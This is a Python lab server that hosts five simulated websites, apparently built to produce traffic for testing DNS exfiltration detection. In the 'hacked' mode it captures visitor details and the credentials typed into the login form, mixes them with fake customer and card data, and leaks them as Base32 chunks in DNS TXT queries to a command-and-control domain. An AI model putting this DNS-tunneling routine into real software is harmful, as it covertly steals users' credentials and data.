"""Web server for 5 lab websites.   python src/site_server.py normal   |   hacked
 - NORMAL sites: serve a page and make ordinary DNS lookups (cdn, api, static ...).
 - HACKED sites: look identical, BUT a malicious module secretly leaks stolen data
   (visitor info + customer records) through DNS tunneling to the site's C2 domain.
SIMULATION for an isolated lab only."""
import base64
import json
import os
import random
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

from dnslib import DNSRecord

from sites_config import SITES, BY_ID, BY_DOMAIN

GROUP = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get("SITE_GROUP", "normal")).lower()
PORT = int(os.environ.get("SITE_PORT", 80))
RESOLVER = os.environ.get("RESOLVER_IP", "172.28.0.2")
DNS_PORT = int(os.environ.get("DNS_PORT", 53))
DATA_DIR = os.environ.get("DATA_DIR", "/data")
EXFIL_QUERIES = int(os.environ.get("EXFIL_QUERIES", 70))     # DNS queries leaked per visit
EXFIL_RATE = float(os.environ.get("EXFIL_RATE", 14))         # queries per second
CHUNK = 30                                                   # bytes of stolen data per query

MY_SITES = [s for s in SITES if s["hacked"] == (GROUP == "hacked")]
MY_IDS = {s["id"] for s in MY_SITES}
STATS_FILE = os.path.join(DATA_DIR, f"site_stats_{GROUP}.json")
stats = {s["id"]: dict(name=s["name"], domain=s["domain"], hacked=s["hacked"], visits=0, normal_dns=0,
                       exfil_sent=0, exfil_ok=0, exfil_failed=0, bytes_leaked=0, bytes_blocked=0)
         for s in MY_SITES}
stats_lock = threading.Lock()


def save_stats():
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with stats_lock, open(STATS_FILE + ".tmp", "w") as f:
            json.dump(stats, f)
        os.replace(STATS_FILE + ".tmp", STATS_FILE)
    except Exception as e:
        print("[site] could not save stats:", e, flush=True)


def dns_query(name, qtype="A"):
    """Send one DNS query to the lab resolver. Returns 'ok', 'refused' or 'timeout'."""
    try:
        data = DNSRecord.question(name, qtype).send(RESOLVER, DNS_PORT, timeout=0.4)
        return "refused" if DNSRecord.parse(data).header.rcode == 5 else "ok"
    except Exception:
        return "timeout"


# ------------------------------------------------------------------ normal behaviour
def normal_activity(site):
    """What a healthy site does when a page is opened: look up its own helper hosts
    (10-14 ordinary lookups spread over a few seconds, mostly A records)."""
    subs = ["www", "api", "cdn", "static", "images", "fonts", "assets", "mail", "login"]
    for _ in range(random.randint(10, 14)):
        dns_query(f"{random.choice(subs)}.{site['domain']}", random.choices(["A", "AAAA"], [0.8, 0.2])[0])
        with stats_lock:
            stats[site["id"]]["normal_dns"] += 1
        time.sleep(random.uniform(0.1, 0.45))
    save_stats()


# ------------------------------------------------------------------ the malicious module
def stolen_data(site, client_ip, agent, creds):
    """Fake 'stolen' data: visitor details, typed credentials and customer records."""
    s = f"HOST={site['domain']};visitor={client_ip};agent={agent[:30]};login={creds}|"
    i = 0
    while len(s) < EXFIL_QUERIES * CHUNK:
        s += f"{i},user{i},user{i}@mail.test,card4{random.randrange(10**14, 10**15)};"
        i += 1
    return s.encode()


def exfiltrate(site, secret):
    """Leak the secret through DNS: every query name carries a Base32 chunk of the data."""
    chunks = [secret[i:i + CHUNK] for i in range(0, len(secret), CHUNK)][:EXFIL_QUERIES]
    ok = failed = fails_in_row = 0
    for seq, chunk in enumerate(chunks):
        label = f"{seq:04x}" + base64.b32encode(chunk).decode().rstrip("=").lower()[:44]
        result = dns_query(f"{label}.{site['c2']}", "TXT")
        with stats_lock:
            st = stats[site["id"]]
            st["exfil_sent"] += 1
            if result == "ok":
                st["exfil_ok"] += 1; st["bytes_leaked"] += len(chunk); ok += 1; fails_in_row = 0
            else:
                st["exfil_failed"] += 1; st["bytes_blocked"] += len(chunk); failed += 1; fails_in_row += 1
        if fails_in_row >= 12:
            break                                   # channel disrupted, malware gives up
        time.sleep(1.0 / EXFIL_RATE)
    print(f"[site:{site['id']}] LEAK attempt via {site['c2']}: ok={ok} blocked={failed} "
          f"(leaked {ok * CHUNK} bytes)", flush=True)
    save_stats()


# ------------------------------------------------------------------ web pages
PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>@@NAME@@</title><style>
*{box-sizing:border-box}body{margin:0;font-family:Segoe UI,Arial,sans-serif;color:#1f2937;background:#f8fafc}
header{background:@@COLOR@@;color:#fff;padding:18px 32px;display:flex;justify-content:space-between;align-items:center}
header h1{margin:0;font-size:1.4rem}nav a{color:#fff;margin-left:18px;text-decoration:none;opacity:.9}
.hero{padding:56px 32px;text-align:center;background:linear-gradient(180deg,@@COLOR@@22,#f8fafc)}
.hero h2{font-size:2.1rem;margin:0 0 10px}.hero p{color:#475569;font-size:1.1rem;margin:0}
.cards{display:flex;gap:18px;flex-wrap:wrap;justify-content:center;padding:10px 32px 30px}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:20px;width:250px;box-shadow:0 1px 3px #0001}
.card b{color:@@COLOR@@}
form{max-width:380px;margin:0 auto 40px;background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:22px}
form h3{margin-top:0}input{width:100%;padding:10px;margin:6px 0 12px;border:1px solid #cbd5e1;border-radius:8px}
button{background:@@COLOR@@;color:#fff;border:0;border-radius:8px;padding:10px 18px;cursor:pointer;width:100%;font-size:1rem}
footer{text-align:center;color:#94a3b8;padding:20px;font-size:.85rem}
</style></head><body>
<header><h1>@@EMOJI@@ @@NAME@@</h1><nav><a href="#">Home</a><a href="#">About</a><a href="#">Contact</a></nav></header>
<section class="hero"><h2>@@TAGLINE@@</h2><p>Welcome to @@DOMAIN@@</p></section>
<section class="cards">@@CARDS@@</section>
<form method="post" action="login"><h3>@@FORM@@</h3>
<input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password">
<button type="submit">Continue</button></form>
<footer>&copy; 2026 @@NAME@@ &middot; lab test website (simulation)</footer></body></html>"""


def render_site(site):
    cards = "".join(f'<div class="card"><b>&#10003;</b> {t}</div>' for t in site["items"])
    page = PAGE
    for k, v in {"NAME": site["name"], "COLOR": site["color"], "EMOJI": site["emoji"],
                 "TAGLINE": site["tagline"], "DOMAIN": site["domain"], "FORM": site["form"], "CARDS": cards}.items():
        page = page.replace(f"@@{k}@@", v)
    return page


def render_portal():
    title = ("Normal websites (5)" if GROUP == "normal"
             else "Compromised websites (5) - simulated hacked sites for lab testing")
    items = "".join(
        f'<a href="/s/{s["id"]}/" style="display:block;background:#fff;border:1px solid #e2e8f0;border-left:6px solid '
        f'{s["color"]};border-radius:10px;padding:14px 18px;margin:10px 0;text-decoration:none;color:#1f2937">'
        f'<b>{s["emoji"]} {s["name"]}</b><br><span style="color:#64748b">{s["domain"]}</span></a>' for s in MY_SITES)
    return (f'<!doctype html><html><head><meta charset="utf-8"><title>{title}</title></head>'
            f'<body style="font-family:Segoe UI,Arial,sans-serif;max-width:560px;margin:40px auto;background:#f8fafc">'
            f'<h2>{title}</h2><p style="color:#64748b">Click a site to open it.</p>{items}</body></html>')


class Handler(BaseHTTPRequestHandler):
    server_version = "LabSite/1.0"

    def log_message(self, *args):
        pass

    def route(self):
        """Pick the site from /s/<id>/... or from the Host header (e.g. gamezone.test)."""
        path = urlparse(self.path).path
        if path.startswith("/s/"):
            parts = path.split("/", 3)
            site = BY_ID.get(parts[2]) if len(parts) > 2 else None
            if site and site["id"] in MY_IDS:
                return site, "/" + (parts[3] if len(parts) > 3 else "")
        host = (self.headers.get("Host") or "").split(":")[0].lower()
        site = BY_DOMAIN.get(host)
        if site and site["id"] in MY_IDS:
            return site, path
        return None, path

    def reply(self, body, code=200, ctype="text/html; charset=utf-8"):
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def trigger(self, site, creds="-"):
        """What happens server-side when someone uses the site."""
        with stats_lock:
            stats[site["id"]]["visits"] += 1
        ip, agent = self.client_address[0], self.headers.get("User-Agent", "?")
        print(f"[site:{site['id']}] visit from {ip} ({'HACKED' if site['hacked'] else 'normal'})", flush=True)
        if site["hacked"]:
            threading.Thread(target=exfiltrate, args=(site, stolen_data(site, ip, agent, creds)), daemon=True).start()
        else:
            threading.Thread(target=normal_activity, args=(site,), daemon=True).start()

    def do_GET(self):
        site, path = self.route()
        if site is None:
            if path in ("/", "/index"):
                return self.reply(render_portal())
            if path == "/__status":
                with stats_lock:
                    return self.reply(json.dumps(stats), ctype="application/json")
            return self.reply("not found", 404, "text/plain")
        if path in ("/", ""):
            self.trigger(site)
            return self.reply(render_site(site))
        return self.reply("not found", 404, "text/plain")

    def do_POST(self):
        site, path = self.route()
        if site is None or not path.endswith("/login"):
            return self.reply("not found", 404, "text/plain")
        length = int(self.headers.get("Content-Length") or 0)
        form = parse_qs(self.rfile.read(length).decode(errors="ignore"))
        creds = f"{form.get('username', ['?'])[0]}:{form.get('password', ['?'])[0]}"
        self.trigger(site, creds)
        return self.reply(f"<html><body style='font-family:Segoe UI;text-align:center;margin-top:80px'>"
                          f"<h2>Thanks! You are signed in to {site['name']}.</h2></body></html>")


if __name__ == "__main__":
    save_stats()
    print(f"[site] {GROUP} websites on port {PORT}: " + ", ".join(s["domain"] for s in MY_SITES), flush=True)
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
